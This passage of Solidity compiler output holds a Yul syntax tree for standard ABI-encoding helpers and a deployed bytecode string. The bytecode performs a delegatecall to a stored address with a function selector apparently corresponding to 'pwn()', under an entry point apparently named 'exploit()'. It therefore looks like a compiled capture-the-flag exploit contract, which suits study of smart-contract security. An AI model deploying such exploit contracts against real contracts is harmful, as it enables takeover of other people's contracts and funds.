															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "92:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "86:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "86:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "76:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "48:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "58:6:1",
														"type": ""
													}
												],
												"src": "7:98:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "224:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "234:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "249:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "234:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "196:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "201:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "212:11:1",
														"type": ""
													}
												],
												"src": "111:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "326:184:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "336:10:1",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "345:1:1",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "340:1:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "405:63:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "430:3:1"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "435:1:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "426:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "426:11:1"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "449:3:1"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "454:1:1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "445:3:1"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "445:11:1"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "439:5:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "439:18:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "419:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "419:39:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "419:39:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "366:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "369:6:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "363:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "363:13:1"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "377:19:1",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "379:15:1",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "388:1:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "391:2:1",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "384:3:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "384:10:1"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "379:1:1"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "359:3:1",
																"statements": []
															},
															"src": "355:113:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dst",
																				"nodeType": "YulIdentifier",
																				"src": "488:3:1"
																			},
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "493:6:1"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "484:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "484:16:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "502:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "477:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "477:27:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "477:27:1"
														}
													]
												},
												"name": "copy_memory_to_memory_with_cleanup",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "308:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "313:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "318:6:1",
														"type": ""
													}
												],
												"src": "264:246:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "624:278:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "634:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "680:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "648:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "648:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "638:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "695:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "778:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "783:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "702:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "702:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "695:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "838:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "845:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "834:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "834:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "852:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "857:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory_with_cleanup",
																	"nodeType": "YulIdentifier",
																	"src": "799:34:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "799:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "799:65:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "873:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "884:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "889:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "880:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "880:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "873:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "605:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "612:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "620:3:1",
														"type": ""
													}
												],
												"src": "516:386:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1042:137:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1053:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1140:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1149:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1060:79:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1060:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1053:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1163:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1170:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1163:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1021:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1027:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1038:3:1",
														"type": ""
													}
												],
												"src": "908:271:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1227:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1237:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1262:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1255:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1255:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1248:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1248:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1237:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1209:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1219:7:1",
														"type": ""
													}
												],
												"src": "1185:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1340:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1357:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1377:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "1362:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1362:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1350:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1350:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1350:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1328:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1335:3:1",
														"type": ""
													}
												],
												"src": "1281:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1491:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1508:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1513:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1501:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1501:19:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1501:19:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1529:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1548:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1553:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1544:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1544:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "1529:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1463:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1468:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "1479:11:1",
														"type": ""
													}
												],
												"src": "1396:168:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1618:54:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1628:38:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1646:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1653:2:1",
																				"type": "",
																				"value": "31"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1642:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1642:14:1"
																	},
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1662:2:1",
																				"type": "",
																				"value": "31"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "1658:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1658:7:1"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1638:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1638:28:1"
															},
															"variableNames": [
																{
																	"name": "result",
																	"nodeType": "YulIdentifier",
																	"src": "1628:6:1"
																}
															]
														}
													]
												},
												"name": "round_up_to_mul_of_32",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1601:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "result",
														"nodeType": "YulTypedName",
														"src": "1611:6:1",
														"type": ""
													}
												],
												"src": "1570:102:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1768:283:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1778:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1824:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "1792:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1792:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "1782:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1839:77:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1904:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1909:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1846:57:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1846:70:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1839:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1964:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1971:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1960:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1960:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1978:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1983:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory_with_cleanup",
																	"nodeType": "YulIdentifier",
																	"src": "1925:34:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1925:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1925:65:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1999:46:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2010:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "2037:6:1"
																			}
																		],
																		"functionName": {
																			"name": "round_up_to_mul_of_32",
																			"nodeType": "YulIdentifier",
																			"src": "2015:21:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2015:29:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2006:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2006:39:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1999:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1749:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1756:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1764:3:1",
														"type": ""
													}
												],
												"src": "1678:373:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2195:269:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2205:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2217:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2228:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2213:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2213:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2205:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "2279:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2292:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2303:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2288:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2288:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2241:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2241:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2241:65:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2327:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2338:2:1",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2323:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2323:18:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "2347:4:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2353:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "2343:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2343:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2316:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2316:48:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2316:48:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2373:84:1",
															"value": {
																"arguments": [
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "2443:6:1"
																	},
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "2452:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2381:61:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2381:76:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2373:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_bool_t_bytes_memory_ptr__to_t_bool_t_bytes_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2159:9:1",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "2171:6:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2179:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2190:4:1",
														"type": ""
													}
												],
												"src": "2057:407:1"
											}
										]
									},
									"contents": "{\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function copy_memory_to_memory_with_cleanup(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        mstore(add(dst, length), 0)\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_tuple_t_bool_t_bytes_memory_ptr__to_t_bool_t_bytes_memory_ptr__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n        mstore(add(headStart, 32), sub(tail, headStart))\n        tail := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value1,  tail)\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c806363d9b77014610030575b600080fd5b61003861003a565b005b60008060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fdd365b8b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161010491906101f7565b600060405180830381855af49150503d806000811461013f576040519150601f19603f3d011682016040523d82523d6000602084013e610144565b606091505b50915091507f13848c3e38f8886f3f5d2ad9dff80d8092c2bbb8efd5b887a99c2c6cfc09ac2a828260405161017a929190610284565b60405180910390a15050565b600081519050919050565b600081905092915050565b60005b838110156101ba57808201518184015260208101905061019f565b60008484015250505050565b60006101d182610186565b6101db8185610191565b93506101eb81856020860161019c565b80840191505092915050565b600061020382846101c6565b915081905092915050565b60008115159050919050565b6102238161020e565b82525050565b600082825260208201905092915050565b6000601f19601f8301169050919050565b600061025682610186565b6102608185610229565b935061027081856020860161019c565b6102798161023a565b840191505092915050565b6000604082019050610299600083018561021a565b81810360208301526102ab818461024b565b9050939250505056fea2646970667358221220f301cbab970a0240c895191b41e80427ea9ff168e4f556f95880807c7488a46d64736f6c63430008110033",
